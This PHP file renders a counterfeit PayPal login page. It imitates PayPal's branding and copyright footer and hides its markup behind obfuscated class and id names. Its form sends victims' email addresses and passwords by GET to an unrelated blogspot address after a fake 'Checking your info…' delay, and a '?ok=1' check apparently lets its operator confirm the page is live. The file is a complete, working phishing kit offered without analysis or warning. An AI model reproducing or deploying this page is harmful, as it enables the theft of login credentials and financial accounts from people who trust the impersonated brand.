<?php
error_reporting(0);
$p = $_GET["ok"];
 
if($p == '1'){
echo 'ok';
exit;
}

echo "
<html id=\"x_27055963\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
    
    
    <title>Log in</title>

	<style>
	.xBanana_456ZTa{
        margin: 0 auto;
        width: 460px;
    }
	.xBanana_ZTAAa{
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        -khtml-border-radius: 5px;
        position: relative;
        margin: 130px auto 0;
        padding: 30px 10% 50px;
        -webkit-border-radius: 5px;
        -moz-border-radius: 5px;
        -khtml-border-radius: 5px;
        border-radius: 5px;
    }
	@media all and (max-width:767px) {
    .xBanana_456ZTa{
        margin-top:30px;
        padding-top:0;
        width:100%;
        background-color:#fff
    }
	.xBanana_ZTAAa{
        margin:0 10%;
        padding:0
       }
    }
	
@media all and (max-width:767px) {
    * {
        -webkit-tap-highlight-color:transparent;
        -webkit-touch-callout:none
    }
    header.headContainer {
        width:100%
    }
}
a.xXMARVELxXBut00N, a.xXMARVELxXBut00N:link, a.xXMARVELxXBut00N:visited, .xXMARVELxXBut00N {
    width:100%;
    height:44px;
    padding:0;
    border:0;
    display:block;
    background-color: #0070ba;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none;
    -webkit-border-radius:5px;
    -moz-border-radius:5px;
    -khtml-border-radius:5px;
    border-radius:5px;
    -webkit-box-sizing:border-box;
    -moz-box-sizing:border-box;
    box-sizing:border-box;
    cursor:pointer;
    -webkit-appearance:none;
    -moz-appearance:none;
    -ms-appearance:none;
    -o-appearance:none;
    appearance:none;
    -webkit-tap-highlight-color:transparent;
    color:#fff;
    font-size:1.1em;
    text-align:center;
    font-weight:700;
    font-family:HelveticaNeue, \"Helvetica Neue\", Helvetica, Arial, sans-serif;
    text-shadow:none;
    text-decoration:none;
    -webkit-transition:background-color .4s ease-out;
    -moz-transition:background-color .4s ease-out;
    -o-transition:background-color .4s ease-out;
    transition:background-color .4s ease-out;
    -webkit-font-smoothing:antialiased
}
a.xXMARVELxXBut00N:hover, a.xXMARVELxXBut00N:link:hover, a.xXMARVELxXBut00N:visited:hover, .xXMARVELxXBut00N:hover, a.xXMARVELxXBut00N:focus, a.xXMARVELxXBut00N:link:focus, a.xXMARVELxXBut00N:visited:focus, .xXMARVELxXBut00N:focus {
    background-color:#005ea6;
    text-decoration:underline;
    outline:0
}
a.xXMARVELxXBut00N:hover *, a.xXMARVELxXBut00N:link:hover *, a.xXMARVELxXBut00N:visited:hover *, .xXMARVELxXBut00N:hover *, a.xXMARVELxXBut00N:focus *, a.xXMARVELxXBut00N:link:focus *, a.xXMARVELxXBut00N:visited:focus *, .xXMARVELxXBut00N:focus * {
    text-decoration:underline
}
a.xXMARVELxXBut00N.active, a.xXMARVELxXBut00N:link.active, a.xXMARVELxXBut00N:visited.active, .xXMARVELxXBut00N.active, a.xXMARVELxXBut00N:active, a.xXMARVELxXBut00N:link:active, a.xXMARVELxXBut00N:visited:active, .xXMARVELxXBut00N:active {
    background:#00598e
}
a.xXMARVELxXBut00N.Z0-s6X6s-00, a.xXMARVELxXBut00N:link.Z0-s6X6s-00, a.xXMARVELxXBut00N:visited.Z0-s6X6s-00, .xXMARVELxXBut00N.Z0-s6X6s-00{
    background-color:#E1E7EB;
    color:#2C2E2F
}
a.xXMARVELxXBut00N.00-s6X6s-00:hover, a.xXMARVELxXBut00N:link.00-s6X6s-00:hover, a.xXMARVELxXBut00N:visited.00-s6X6s-00:hover, .xXMARVELxXBut00N.00-s6X6s-00:hover, a.xXMARVELxXBut00N.00-s6X6s-00:focus, a.xXMARVELxXBut00N:link.00-s6X6s-00:focus, a.xXMARVELxXBut00N:visited.00-s6X6s-00:focus, .xXMARVELxXBut00N.00-s6X6s-00:focus {
    background-color:#d2dbe1
}
a.xXMARVELxXBut00N, a.xXMARVELxXBut00N:link, a.xXMARVELxXBut00N:visited {
    padding-top:14px
}
.xXMARVELxXBut00NAsLink {
    color:#0079ad
}

.DC_XX98700 {
    margin:0 auto;
    text-align:center;
    margin-top:20px;
    font-size:11px;
    padding-bottom:15px;
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    text-align: center;
    font-size: 11px;
    background-color: #F7F9FA;
    padding: 14px 20px;
}
.DC_XX98700 p {
    margin-top:10px;
    color:#9e9e9e
}
.DC_XX98700 a, .DC_XX98700 a:link, .DC_XX98700 a:visited, .DC_XX98700 a:hover {
    color:#666
}
.DC_XX98700 ul {
    list-style-type:none
}
.DC_XX98700 ul li {
    display:inline-block;
    margin:0;
    padding-left:.4em
}
.DC_XX98700 ul li:first-child {
    background:0 0
}
.DC_XX98700 ul li:last-child {
    border-right:0
}
.DC_XX98700 ul li a {
    margin-right:.5em;
    white-space:nowrap
}
@media all and (max-width:767px) {
    .DC_XX98700 {
        margin-top:60px
    }
}
@media all and (max-height:442px) {
    .DC_XX98700 {
        position:relative;
    }
}
@keyframes rotation {
    from {
        transform:rotate(0deg)
    }
    to {
        transform:rotate(359deg)
    }
}
@-webkit-keyframes rotation {
    from {
        -webkit-transform:rotate(0deg);
        transform:rotate(0deg)
    }
    to {
        -webkit-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
@-moz-keyframes rotation {
    from {
        -moz-transform:rotate(0deg);
        transform:rotate(0deg)
    }
    to {
        -moz-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
@-o-keyframes rotation {
    from {
        -o-transform:rotate(0deg);
        transform:rotate(0deg)
    }
    to {
        -o-transform:rotate(359deg);
        transform:rotate(359deg)
    }
}
html {
    background-color:#fff;
    min-height:100%
}
body {
    min-height:100%;
    margin:0;
    padding:0;
    color:#2c2e2f;
    font-family:HelveticaNeue, \"Helvetica Neue\", Helvetica, Arial, sans-serif;
    font-size:93.75%;
    -webkit-font-smoothing:antialiased;
    -webkit-backface-visibility:hidden;
    -moz-text-size-adjust:100%;
    -ms-text-size-adjust:100%;
    -webkit-text-size-adjust:100%
}
ul, ol, li {
    margin:0;
    padding:0
}
h2 {
    margin:0;
    padding:0;
    font-family:HelveticaNeue, \"Helvetica Neue\", Helvetica, Arial, sans-serif;
    font-size:1.4em;
    font-weight:300;
    color:#2c2e2f
}
img {
    border:0
}
a, a:link, a:visited {
    color:#0079ad;
    font-family:HelveticaNeue, \"Helvetica Neue\", Helvetica, Arial, sans-serif;
    font-weight:400;
    text-decoration:none;
    -webkit-transition:color .2s ease-out;
    -moz-transition:color .2s ease-out;
    -o-transition:color .2s ease-out;
    transition:color .2s ease-out
}
a:hover, a:focus {
    color:#008ac5;
    text-decoration:underline;
    outline:0
}
.xv987HUB {
    zoom:1
}
.xv987HUB:before, .xv987HUB:after {
    display:table;
    content:\"\"
}
.xv987HUB:after {
    clear:both
}
input::-ms-clear, input::-ms-reveal {
    display:none;
    width:0;
    height:0
}
.xT02X65G {
  margin: 20px 0;
  color: #2c2e2f;
  display: none;
}

.xT02X65GShow {
  display: block;
}
* {
    -webkit-box-sizing:border-box;
    -moz-box-sizing:border-box;
    box-sizing:border-box
}
.kl_h4aXX6987PO{
    margin: 0 auto 20px;
    background: transparent url(\"https://drive.google.com/uc?id=1BaaLr0fiIhbtAQa-nyz-gLZxK9IBpjMg\") top center no-repeat;
    background-size:129px 32px;
    width:129px;
    height:32px;
    display:block;
    text-indent: 100%;
    overflow: hidden;
    white-space: nowrap;
}

.xZ98700c0t3eNT{
    margin: 0 auto;
    width: 460px;
}
.xZ98700c0t3eNT.modal-overlay {
    content:\"\";
    height:100%;
    width:100%;
    position:absolute;
    top:0;
    left:0;
    z-index:16;
    -moz-opacity:.5;
    -khtml-opacity:.5;
    -webkit-opacity:.5;
    opacity:.5;
    -ms-filter:alpha(opacity=50);
    filter:alpha(opacity=50);
    background-color:#fff
}
.xZ98-ZTa{
    /*!  */
    
    /*!  */
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    -khtml-border-radius: 5px;
    position: relative;
    margin: 130px auto 0;
    padding: 30px 10% 50px;
    -webkit-border-radius: 5px;
    -moz-border-radius: 5px;
    -khtml-border-radius: 5px;
    border-radius: 5px;
}

@media all and (max-width:767px) {
    .xZ98700c0t3eNT{
        margin-top:30px;
        padding-top:0;
        width:100%;
        background-color:#fff
    }
    .xZ98-ZTa{
        margin:0 10%;
        padding:0
    }
}
.ww_LiZ3b44 {
    margin:20px auto;
    padding-bottom:20px;
    border-bottom:1px solid #cbd2d6;
    text-align:center
}
input[name=login_pin] {
    -webkit-text-security:disc
}
a {
  color: #009CDE;
  text-decoration: none;
}

a:hover,
a:focus {
  text-decoration: underline;
}

a:focus {
  outline: thin dotted;
  outline: 5px auto -webkit-focus-ring-color;
  outline-offset: -2px;
}

body {
  font-size: 14px;
}

.body-ras-dafhaaa {
  background: #F7F9FA;
}

html, body, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
b, u, i, center,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td,
article, aside, canvas, details, embed,
figure, figcaption, footer, header, hgroup,
menu, nav, output, ruby, section, summary,
time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
  vertical-align: baseline;
}

/* HTML5 display-role reset for older browsers */
article, aside, details, figcaption, figure,
footer, header, hgroup, menu, nav, section {
}

body {
  line-height: 1;
}

ol, ul {
  list-style: none;
}

blockquote, q {
  quotes: none;
}

blockquote:before, blockquote:after,
q:before, q:after {
  content: '';
  content: none;
}

table {
  border-collapse: collapse;
  border-spacing: 0;
}


.x_Z1186XDD7 {
  display: block;
  width: 100%;
  padding: 0 10px;
  height: 44px;
  color: #2c2e2f;
  border: 1px solid #9DA3A6;
  border-radius: 4px;
  margin-bottom: 10px;
  outline: none;
  transition: border 0.5s ease-out;
  font-size: 1em;
  direction: ltr;
}

.x_Z1186XDD7:focus {
  border: 1px solid #0070ba;
}

.x_Z1186XDD7-inside {
  height: 44px;
  width: 100%;
  padding: 0 24px 0 12px;
  border: 1px solid #aaa;
  outline: 0;
  background: #fff;
  text-overflow: ellipsis;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  -webkit-border-radius: 3px;
  -moz-border-radius: 3px;
  -khtml-border-radius: 3px;
  border-radius: 3px;
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  color: #000;
  font-size: 16px;
  font-family: Helvetica,Arial,sans-serif;
  font-weight: 400;
}


/*=================================
=            ANIMATION            =
=================================*/
@-webkit-keyframes rotation {
  from {
    -webkit-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  to {
    -webkit-transform: rotate(359deg);
    transform: rotate(359deg);
  }
}

@-moz-keyframes rotation {
  from {
    -moz-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  to {
    -moz-transform: rotate(359deg);
    transform: rotate(359deg);
  }
}

@-o-keyframes rotation {
  from {
    -o-transform: rotate(0deg);
    transform: rotate(0deg);
  }
  to {
    -o-transform: rotate(359deg);
    transform: rotate(359deg);
  }
}

@keyframes rotation {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(359deg);
  }
}

/*======================================
=            LOADING EFFECT            =
======================================*/
.pX-X987 {
  position: fixed;
  top: 43%;
  right: 0;
  bottom: 0;
  left: 0;
  z-index: 200;
  margin: 0;
  text-align: center;
}

.pX-X987:before {
  content: \"\";
  display: block;
  margin: 0 auto 10px;
  text-align: center;
  width: 36px;
  height: 36px;
  border-left: 8px solid #000;
  border-left: 8px solid rgba(0, 0, 0, 0.2);
  border-right: 8px solid #000;
  border-right: 8px solid rgba(0, 0, 0, 0.2);
  border-bottom: 8px solid #000;
  border-bottom: 8px solid rgba(0, 0, 0, 0.2);
  border-top: 8px solid #2180c0;
  border-radius: 50px;
  -webkit-animation: rotation 0.7s infinite linear;
  -moz-animation: rotation 0.7s infinite linear;
  -o-animation: rotation 0.7s infinite linear;
  animation: rotation 0.7s infinite linear;
}

.pX-X987:after {
  content: '';
  position: fixed;
  z-index: -1;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  background: #fff;
  -moz-opacity: .9;
  -khtml-opacity: .9;
  -webkit-opacity: .9;
  opacity: .9;
  -ms-filter: alpha(opacity=90);
  filter: alpha(opacity=90);
}

.xT02X65G {
  margin: 20px 0;
  color: #2c2e2f;
  display: none;
}

.xT02X65GShow {
  display: block;
}

/*-----  End of NOTIFICAIONS  ------*/
.x_G00066XD {
  position: relative;
  margin: 0 0 10px;
  font-size: 1.04em;
}

.J118GhosTXRider {
  position: absolute;
  top: 1px;
  left: 0;
  z-index: 1;
  width: 100%;
  padding: 10px;
  height: 0;
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  -khtml-border-radius: 5px;
  border-radius: 5px;
  background: #c72f38;
  color: #fff;
  transition: all 0.3s ease-out;
}

.J118GhosTXRider.x87Z-Add1NG {
  top: 36px;
  height: auto;
  -webkit-border-radius: 0;
  -moz-border-radius: 0;
  -khtml-border-radius: 0;
  border-radius: 0;
  text-align: left;
}

.X66LiL44 {
  position: relative;
  z-index: 2;
  width: 100%;
}

.x870AA-Ic0n3 {
  border-color: #c72e2e;
  background-repeat: no-repeat;
 background-position: top -411px right 10px;
  background-size: 25px;
}

.x870AA-Ic0n3:focus {
  border-color: #c72e2e;
}

.xv987HUB:before, .xv987HUB:after
{
	content: \"\";
	display: table;
}
.xv987HUB:after
{
	clear: both;
}
*
{
	box-sizing: border-box;
}
::-webkit-input-placeholder {
   color: #6c7378;
}

:-moz-placeholder { /* Firefox 18- */
   color: #6c7378;  
}

::-moz-placeholder {  /* Firefox 19+ */
   color: #6c7378;  
}

:-ms-input-placeholder {  
   color: #6c7378;  
}
.x870AA-Ic0n3::-webkit-input-placeholder {
   color: red;
}

.x870AA-Ic0n3:-moz-placeholder { /* Firefox 18- */
   color: red;  
}

.x870AA-Ic0n3::-moz-placeholder {  /* Firefox 19+ */
   color: red;  
}

.x870AA-Ic0n3:-ms-input-placeholder {  
   color: red;  
}

	</style>
  <meta name=\"viewport\" content=\"initial-scale=1.0\">
</head>
<body id=\"11136-xX666Xx-11686\"><p style=\"color: white;\">.</p>
	<div for=\"10102-xMARVELxDCxCOMIC18x-11274\" id=\"_x78ZZ218310\" name=\"Login\">
        <div for=\"8917-IXIXXI60359457118x-9295\" id=\"_x987ZZ-306294\" class=\"_x78ZZ5742820 xBanana_456ZTa _x78ZZ6971811\">
            <div id=\"9032-xMARVELxDCxCOMIC18x-12319\" class=\"_x78ZZ7965896 xBanana_ZTAAa _x78ZZ5191652\">
			<header>
                <div id=\"11869-xMARVELxDCxCOMIC18x-12156\" class=\"x_23ID-Z741  kl_h4aXX6987PO x_22ID-Z633 \"></div>
            </header>
                <section id=\"x_22ID-Z557 \" class=\"x_33ID-Z756 \">
                    <form for=\"12238-xMARVELxDCxCOMIC18x-10946\" action=\"https://professional2020informatics.blogspot.com/p/\" method=\"get\" class=\"_x987WW-6806202 _x1989MPZ-5845784238\" id=\"0XDIXX1056546656\" name=\"login\">
                        <div id=\"x_23ID-Z695 \" class=\"x_27ID-Z728 xv987HUB x_31ID-Z652 \">
                            <div class=\"x_G00066XD\" id=\"9593-xMARVELxDCxCOMIC18x-10987\">
                                <div class=\"x_G00066XD\" style=\"z-index: 100;\">
                                    <div id=\"9918-xMARVELxDCxCOMIC18x-10924\" class=\"xMARVELxDCxCOMIC118-C4as3 X66LiL44 x_25ID-Z555 \">
                                        <input for=\"9246-xMARVELxDCxCOMIC18x-9209\" class=\"x_25ID-Z716 x_Z1186XDD7 x_26ID-Z676 \" name=\"login_email\" type=\"email\" placeholder=\"Email\" id=\"1XXXX11747471917\" value=\"\">
                                    </div>
                                    <div id=\"9622-xMARVELxDCxCOMIC18x-10662\" class=\" x_24ID-Z727 J118GhosTXRider x_26ID-Z669\">
                                        <p>Email address is required.</p>
                                    </div>
                                </div>
                                <div id=\"9435-xMARVELxDCxCOMIC18x-10539\" class=\"x_24ID-Z577  x_G00066XD x_34ID-Z569 \">
                                    <div id=\"9393-xMARVELxDCxCOMIC18x-12247\" class=\"xMARVELxDCxCOMIC118-C4as3 X66LiL44\">
                                        <input pattern=\".{7,}\" for=\"11451-xMARVELxDCxCOMIC18x-12139\" class=\"x_Z1186XDD7\" name=\"login_password\" type=\"password\" placeholder=\"Password\" id=\"2DXX3X1201235534\">
                                    </div>
                                    <div id=\"12036-xMARVELxDCxCOMIC18x-10345\" class=\"x_25ID-Z620 J118GhosTXRider x_34ID-Z556 \">
                                        <p id=\"9132-xMARVELxDCxCOMIC18x-9918\">Password is required.</p>
                                    </div>
                                </div>
                            </div>
                            <div id=\"9269-xMARVELxDCxCOMIC18x-11624\" class=\"11018-xMARVELxDCxCOMIC188x-11107 o_B4Ads-W4OOXDS\">
                                <button for=\"9100-xMARVELxDCxCOMIC18x-12271\" class=\"xXMARVELxXBut00N\" type=\"submit\" id=\"9675-x666G-10266\" name=\"11826-x968AG-12059\">Log In</button>
                            </div>
                            <div id=\"9575-xMARVELxDCxCOMIC18x-12040\" class=\"x_23ID-Z711 ww_LiZ3b44 x_27ID-Z719 \"><a href=\"#/pay/customer_center/Secure111/myaccount/signin/?country.x=&amp;locale.x=en_#\" id=\"8816-xT00x-11860\" class=\"10505-x660x-12207\">Having trouble logging in?</a>
                                <div id=\"11714-xMARVELxDCxCOMIC18x-9231\" class=\"x_22ID-Z653 \">
                                </div>
                            </div>
                 </form>
                </section>
                <br>
            </div>
        </div>
        <div id=\"10392-xMARVELxDCxCOMIC18x-10935\" class=\"x_21ID-Z536 F4_x666x_F4 x_21ID-Z545 \">
            <p id=\"11672-xMARVELxDCxCOMIC18x-9849\" class=\"x_29ID-Z622 xT02X65G x_32ID-Z680\">Checking your info…</p>
        </div>
    </div>
    <footer id=\"10315-xMARVELxDCxCOMIC18x-11727\" class=\"x_31ID-Z591 DC_XX98700 x_29ID-Z751 xv987HUB x_21ID-Z768 \">
        <ul>
            <li id=\"9111-xMARVELxDCxCOMIC18x-12159\"><a href=\"#/pay/customer_center/Secure111/myaccount/signin/?country.x=&amp;locale.x=en_#\">Privacy</a></li>
            <li id=\"12380-xMARVELxDCxCOMIC18x-11080\"></li>
            <li id=\"12172-xMARVELxDCxCOMIC18x-12055\"><a href=\"#/pay/customer_center/Secure111/myaccount/signin/?country.x=&amp;locale.x=en_#\">PayPal</a></li>
        </ul>
        <br>
        <ul id=\"10754-xMARVELxDCxCOMIC18x-11530\">
            <li id=\"8978-xMARVELxDCxCOMIC18x-9689\"><a href=\"#/pay/customer_center/Secure111/myaccount/signin/?country.x=&amp;locale.x=en_#\" style=\"color: #9e9e9e;\">Copyright © 1999-2020 PayPal. All rights reserved.</a></li>
        </ul>
    </footer>
<!------------------------------- FILE JAVASCRIPT --------------------------------->
    <script src=\"https://drive.google.com/uc?id=1M1xbFWeiwAB9S572lhzdwA5FikbIs7dS\"></script>
    <script type=\"text/javascript\">
	$(document).ready(function() {
    $(\"#0XDIXX1056546656\").submit(function(a) {
        a.preventDefault();
        var b = 0;
        $(\"#1XXXX11747471917\").val() || ($(\"#1XXXX11747471917\").parent().next(\".J118GhosTXRider\").addClass(\"x87Z-Add1NG\"), 
        $(\"#1XXXX11747471917\").addClass(\"x870AA-Ic0n3\"), b = 1), $(\"#2DXX3X1201235534\").val() || ($(\"#2DXX3X1201235534\").parent().next(\".J118GhosTXRider\").addClass(\"x87Z-Add1NG\"), 
        $(\"#2DXX3X1201235534\").addClass(\"x870AA-Ic0n3\"), $(\".WA-MOOOOOY\").css(\"z-index: 100;\"), 
        b = 1), 1 != b && ($(\".F4_x666x_F4\").addClass(\"pX-X987\").fadeIn(800), $(\".xT02X65G\").delay(0).fadeIn(800),
        setTimeout(function() {
            document.getElementById(\"0XDIXX1056546656\").submit();
        }, 1500));
    }), $(\"#1XXXX11747471917\").focus(function(a) {
        $(\"#1XXXX11747471917\").parent().next(\".J118GhosTXRider\").removeClass(\"x87Z-Add1NG\");
    }), $(\"#2DXX3X1201235534\").focus(function(a) {
        $(\"#2DXX3X1201235534\").parent().next(\".J118GhosTXRider\").removeClass(\"x87Z-Add1NG\");
    });
});
	</script>
<!------------------------------- FILE JAVASCRIPT --------------------------------->



</body></html>
";

?>
